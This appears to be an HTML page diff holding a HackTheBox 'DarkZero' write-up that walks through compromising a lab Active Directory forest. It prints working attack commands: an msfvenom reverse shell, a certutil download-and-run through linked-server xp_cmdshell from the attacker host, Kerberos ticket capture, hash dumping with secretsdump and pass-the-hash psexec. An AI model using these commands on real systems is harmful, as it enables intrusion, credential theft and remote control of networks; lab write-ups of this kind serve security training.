@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="HTB DarkZero writeup by Rachel Murphy — Hard Windows Active Directory exploitation and privilege escalation walkthrough." />
+  <title>HTB: DarkZero | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; background: rgba(0,0,0,0.04); padding: 0.6rem; border-radius: 6px; }
+    pre { margin: 0; padding: 0.6rem; background: #0f1724; color: #e6eef6; border-radius: 6px; overflow-x: auto; font-family: ui-monospace, "Roboto Mono", monospace; }
+    .machine-summary { margin-bottom: 1.5rem; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>HTB: DarkZero</h1>
+    <p>Windows Active Directory</p>
+    <nav>
+      <ul class="main-nav">
+        <li><a href="/index.html">Home</a></li>
+        <li><a href="/writeups/index.html">Writeups</a></li>
+        <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+        <li><a href="/tools/index.html">Tools</a></li>
+        <li><a href="/about.html">About</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="wrap">
+
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Hard</p>
+      <p><strong>Platform:</strong> HackTheBox</p>
+      <p><strong>Operating System:</strong> Windows</p>
+      <p><strong>Description:</strong> DarkZero is a hard-level Windows Active Directory domain machine from HackTheBox. It challenges players to exploit a SQL-linked server trust, perform Kerberos abuse, privilege escalation via a recent Windows kernel vulnerability (CVE-2024-30088), and pivot across forest trusts to achieve full domain compromise.</p>
+      <img class="screenshot" src="../images/Pasted image 20251006115145.png" alt="DarkZero HTB banner">
+    </section>
+
+    <article>
+
+      <section>
+        <h2>Autorecon</h2>
+        <p>Start automated enumeration to collect Nmap scans, SMB info, and banners for the target IP. Autorecon is a solid starting point to establish the service landscape.</p>
+        <div class="code-block"><pre>autorecon -t ip.txt -vvv --ignore-plugin-checks</pre></div>
+        <p>The initial discovery reveals the domain context <code>DC=darkzero,DC=htb</code>.</p>
+      </section>
+
+      <section>
+        <h2>Nmap Enumeration</h2>
+        <p>Autorecon’s output shows multiple open ports indicating a domain controller setup — LDAP, SMB, Kerberos, and MSSQL all visible.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20251006132033.png" alt="Nmap scan initial ports">
+        <p>Open ports include: 53, 88, 135, 139, and 389.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20251006132134.png" alt="Nmap continuation ports">
+        <p>Additional services on 445 (SMB), 593, and 636 (LDAPS).</p>
+
+        <img class="screenshot" src="../images/Pasted image 20251006132223.png" alt="MSSQL 1433 open">
+        <p>Port 1433 confirms an MSSQL database server, often a key initial vector.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20251006132257.png" alt="Nmap extra ports 2179 and 3268">
+        <p>Port 2179 corresponds to Microsoft Remote Desktop Virtualization Host, and 3268/3269 indicate Global Catalog ports — confirming AD DS presence.</p>
+
+        <p><strong>Credentials provided:</strong> <code>john.w / RFulUtONCOL!</code></p>
+      </section>
+
+      <section>
+        <h2>BloodHound Enumeration</h2>
+        <p>With valid credentials, run BloodHound to collect AD relationship data. This helps visualize trust relationships and potential lateral paths.</p>
+        <div class="code-block"><pre>python3 bloodhound.py -ns 10.10.11.89 -d darkzero.htb -dc dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -c All</pre></div>
+      </section>
+
+      <section>
+        <h2>RPC Enumeration</h2>
+        <p>Enumerate user and group information over RPC using authenticated access.</p>
+        <div class="code-block"><pre>rpcclient -U "john.w" 10.10.11.89</pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251008103439.png" alt="rpcclient user lookup">
+        <p>Looked up <code>john.w</code> SID and confirmed user presence. RID brute-forcing revealed the <code>darkzero-ext$</code> machine account, validating a forest trust to <code>darkzero.ext</code>.</p>
+        <img class="screenshot" src="../images/Pasted image 20251008114149.png" alt="RID brute results darkzero-ext$">
+      </section>
+
+      <section>
+        <h2>Cross-Forest Trust Discovery</h2>
+        <p>BloodHound cypher query confirmed a cross-forest trust between the two domains.</p>
+        <div class="code-block"><pre>MATCH p=(d1:Domain)-[r:CrossForestTrust]->(d2:Domain) RETURN p</pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251008115650.png" alt="BloodHound trust graph">
+        <p>Found a trust relationship: <code>darkzero.htb</code> ↔ <code>darkzero.ext</code>.</p>
+      </section>
+
+      <section>
+        <h2>Initial Access via MSSQL</h2>
+        <p>With <code>john.w</code> credentials, access MSSQL to check for linked servers.</p>
+        <div class="code-block"><pre>impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth</pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251008120015.png" alt="mssqlclient successful connection">
+        <p>Enumerate linked servers and discover <code>DC02.darkzero.ext</code> linked as a remote SQL server.</p>
+        <img class="screenshot" src="../images/Pasted image 20251008131855.png" alt="Linked server DC02.darkzero.ext">
+        <p>This link allows command execution as <code>darkzero-ext\svc_sql</code>.</p>
+      </section>
+
+      <section>
+        <h2>Command Execution via xp_cmdshell</h2>
+        <p>Confirm xp_cmdshell availability and privilege context on the linked server.</p>
+        <img class="screenshot" src="../images/Pasted image 20251008135543.png" alt="xp_cmdshell exists">
+        <img class="screenshot" src="../images/Pasted image 20251008135659.png" alt="whoami result on linked server">
+        <p>Execution context: <code>darkzero-ext\svc_sql</code>.</p>
+      </section>
+
+      <section>
+        <h2>Reverse Shell Execution</h2>
+        <p>Generate and transfer a reverse shell payload via certutil.</p>
+<p>Create Msfvenom reverse shell payload </p>       
+<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=9001 -f exe > reverse.exe</code>
+<p>Set up Python http server to serve up payload</p>  
+<code>python3 -m http.server 8888</code>
+<p>Set up nc listener to catch reverse shell</p>  
+<code>sudo rlwrap nc -lvnp 9001</code>
+<p>Transfer reverse.exe msfvenom payload through mssqlclient session</p>  
+<code>EXEC ('EXEC master..xp_cmdshell ''certutil -urlcache -split -f http://10.10.16.18:8888/reverse.exe C:\temp\reverse.exe''') AT [DC02.darkzero.ext];</code>
+<p>Execute reverse.exe through mssqlclient session</p>  
+<code>EXEC ('EXEC master..xp_cmdshell ''C:\temp\reverse.exe''') AT [DC02.darkzero.ext];</code>
+        </pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251008151904.png" alt="Reverse shell obtained">
+        <p>Got initial shell as <code>svc_sql</code> on <code>DC02.darkzero.ext</code>.</p>
+      </section>
+
+      <section>
+        <h2>Privilege Escalation</h2>
+        <p>Use SharpHound for deeper enumeration and run WinPEAS to identify local privilege escalation vectors.</p>
+        <img class="screenshot" src="../images/Pasted image 20251008152923.png" alt="Systeminfo architecture check">
+        <img class="screenshot" src="../images/Pasted image 20251009212718.png" alt="WinPEAS output kernel version">
+        <p>Kernel version: 10.0.20348 → vulnerable to CVE-2024-30088 (Windows Kernel EoP).</p>
+      </section>
+
+      <section>
+        <h2>Failed CVE-2024-30088 Exploitation (Metasploit)</h2>
+        <p>Attempted to use Metasploit’s <code>exploit/windows/local/cve_2024_30088_authz_basep</code> module but the session repeatedly died — likely due to payload architecture mismatch or permissions.</p>
+        <img class="screenshot" src="../images/Pasted image 20251009214114.png" alt="Metasploit exploit attempt">
+      </section>
+
+      <section>
+        <h2>Custom CVE-2024-30088 Exploit</h2>
+        <p>Compiled a custom PoC from GitHub (<a href="https://github.com/tykawaii98/CVE-2024-30088" target="_blank">tykawaii98 PoC</a>) after modifying <code>CreateProcessFromHandle</code> to launch my reverse shell instead of <code>cmd.exe</code>.</p>
+        <img class="screenshot" src="../images/Pasted image 20251009201402.png" alt="PoC code modification">
+        <img class="screenshot" src="../images/Pasted image 20251009194455.png" alt="Successful custom exploit execution">
+        <p>Execution succeeded — captured a reverse shell as <code>NT AUTHORITY\SYSTEM</code>.</p>
+      </section>
+
+      <section>
+        <h2>Pivot to DC01 via Forest Trust</h2>
+        <p>Set up a Ligolo-NG tunnel to pivot into the <code>darkzero.ext</code> domain and access internal systems (172.16.20.0/24).</p>
+        <img class="screenshot" src="../images/Pasted image 20251008204654.png" alt="Ligolo tunnel established">
+        <p>Confirmed connectivity to DC01 at <code>172.16.20.2</code>.</p>
+      </section>
+
+      <section>
+        <h2>Abusing TGT for DC01$</h2>
+        <p>Used Rubeus in monitor mode to capture a TGT for <code>DC01$</code> when MSSQL triggered an outbound authentication request.</p>
+        <img class="screenshot" src="../images/Pasted image 20251009194733.png" alt="Rubeus captured TGT">
+        <p>Converted the ticket for use with Impacket:</p>
+        <div class="code-block"><pre>
+
+base64 -d hash.b64 > ticket.kirbi
+
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+export KRB5CCNAME=ticket.ccache
+
+sudo ntpdate 10.10.11.89
+
+impacket-secretsdump -k -no-pass -dc-ip 10.10.11.89 DARKZERO.HTB/dc01\$@dc01.darkzero.htb
+        </pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251009200142.png" alt="Secretsdump DC01 NT hashes">
+        <p>Dumped NT hashes and extracted Administrator credentials.</p>
+      </section>
+
+      <section>
+        <h2>Full Domain Compromise</h2>
+        <p>Validated Administrator hash and executed <code>psexec</code> for full system access.</p>
+        <div class="code-block"><pre>
+nxc smb darkzero.htb -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726
+
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726 administrator@10.10.11.89
+        </pre></div>
+        <img class="screenshot" src="../images/Pasted image 20251009200912.png" alt="Administrator shell via psexec">
+        <p>Obtained SYSTEM access on DC01 and captured the root flag.</p>
+      </section>
+
+      <section>
+        <h2>Summary & Lessons Learned</h2>
+        <p><strong>DarkZero</strong> was a multi-stage Active Directory exploitation challenge requiring persistence and pivoting skills. Key takeaways:</p>
+        <ul>
+          <li>Cross-forest trusts can expose lateral movement vectors.</li>
+          <li>Linked SQL servers often provide powerful remote execution opportunities.</li>
+          <li>Rubeus remains essential for ticket abuse and delegation attacks.</li>
+          <li>Modern kernel exploits (like CVE-2024-30088) can be leveraged if compiled and adapted manually.</li>
+          <li>Ligolo-NG is an excellent tunneling tool for internal AD pivots.</li>
+        </ul>
+      </section>
+
+    </article>
+  </main>
+
+  <footer>
+    <div class="wrap site-footer">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a> | <a href="/about.html">About</a></p>
+      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
+    </div>
+  </footer>
+
+</body>
+</html>
